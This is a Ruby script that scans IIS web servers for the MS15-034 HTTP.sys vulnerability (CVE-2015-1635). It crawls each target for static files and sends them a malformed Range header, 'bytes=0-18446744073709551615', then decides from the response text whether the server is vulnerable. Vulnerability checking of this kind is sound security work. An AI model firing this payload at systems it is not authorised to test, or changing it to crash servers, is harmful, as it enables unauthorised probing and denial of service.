#!/usr/bin/env ruby

#
## Author: Erwan Le Rousseau (RandomStorm)
#
# As Nessus fails to correctly detect this issue (seems to only check for the welcome.png),
# and not giving any output on the file that was tested, this script test all potential static files
# that are most likely to have the IIS Kernel cache enabled, such as JS, CSS etc for the MS-15-034.
#
## References:
# https://technet.microsoft.com/en-us/library/security/ms15-034.aspx
# http://www.cvedetails.com/cve/CVE-2015-1635/
# https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/dos/http/ms15_034_ulonglongadd.rb
##
#

require 'typhoeus'
require 'nokogiri'
require 'optparse'
require 'addressable/uri'

@opts = {
  verbose:        false,
  proxy:          nil,
  timeout:        20,
  connecttimeout: 10,
  user_agent:     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:37.0) Gecko/20100101 Firefox/37.0'
}

URL_PATTERN        = %r{^https?://}
VULNERABLE_PATTERN = /Requested Range Not Satisfiable/i
SAFE_PATTERN       = /The request has an invalid header name/i

opt_parser = OptionParser.new('Usage: ./ms15-034-checker.rb [options] URL-OR-FILE', 30) do |opts|
  opts.on('--proxy PROXY', '-p', 'Proxy to use, e.g: socks5://127.0.0.1:9090') do |proxy|
    @opts[:proxy] = proxy
  end

  opts.on('--timeout SECONDS', 'The number of seconds for the request to be performed, default 20s') do |timeout|
    @opts[:timeout] = timeout
  end

  opts.on('--connect-timeout SECONDS', 'The number of seconds for the connection to be established before timeout, default 5s') do |timeout|
    @opts[:connecttimeout] = timeout
  end

  opts.on('--verbose', '-v', 'Verbose Mode') do
    @opts[:verbose] = true
  end
end

opt_parser.parse!

module Typhoeus
  # Custom Response class
  class Response
    # @return [ Nokogiri::HTML ] The response's body parsed by Nokogiri
    def html
      @html ||= Nokogiri::HTML(body.encode('UTF-8', invalid: :replace, undef: :replace))
    end
  end
end

class Target
  attr_reader :uri

  def initialize(url)
    # Adds a trailing slash if not present
    @uri = Addressable::URI.parse(
      url[-1, 1] != '/' ? url + '/' : url
    )
  end

  def url
    @uri.to_s
  end

  def in_scope_urls(res, xpath = '//link|//script|//style|//img', attributes = %w(href src))
    found = []

    res.html.xpath(xpath).each do |tag|
      attributes.each do |attribute|
        attr_value = tag[attribute]

        next unless attr_value && !attr_value.empty?

        url = uri.join(attr_value.strip).to_s

        next unless in_scope?(url)

        yield url, tag if block_given? && !found.include?(url)

        found << url
      end
    end

    found.uniq
  end

  def in_scope?(url)
    Addressable::URI.parse(url.strip).host == @uri.host
  end
end

def request_params
  {
    timeout: @opts[:timeout],
    connecttimeout: @opts[:connecttimeout],
    proxy: @opts[:proxy],
    followlocation: true,
    headers: { 'User-Agent' => @opts[:user_agent] }
  }
end

def check_exploit(url)
  res = send_payload(url)

  if res && res.body =~ VULNERABLE_PATTERN
    'vulnerable'
  elsif res && res.body =~ SAFE_PATTERN
    'safe'
  else
    'unknown'
  end  
end

def send_payload(url)
  Typhoeus.get(
    url,
    request_params.merge(
      headers: {
        'Range' => 'bytes=0-18446744073709551615',
        'User-Agent' => @opts[:user_agent]
      }
    )
  )
end

argv    = ARGV[0]
targets = []

unless argv
  puts opt_parser.help
  exit(0)
end

if argv =~ URL_PATTERN
  targets << Target.new(argv)
else
  File.open(argv).each do |line|
    if line =~ URL_PATTERN
      targets << Target.new(line.chomp)
    elsif @opts[:verbose]
      puts "[Warning] - #{line.chomp} is not a valid URL - Ignored"
    end
  end
end

targets.each do |target|
  begin
    puts
    puts "[+] Checking #{target.url}"

    res = Typhoeus.get(target.url, request_params)

    (target.in_scope_urls(res) << target.uri.join('welcome.png').to_s).each do |url|
      print " | #{url} - "

      state = check_exploit(url)

      puts state

      break unless state == 'unknown'
    end
  rescue Interrupt
    puts 'Interrupted by user, jumping to next target'
    next
  rescue => e
    puts "[Error] - #{e.message}"
    next
  end
end



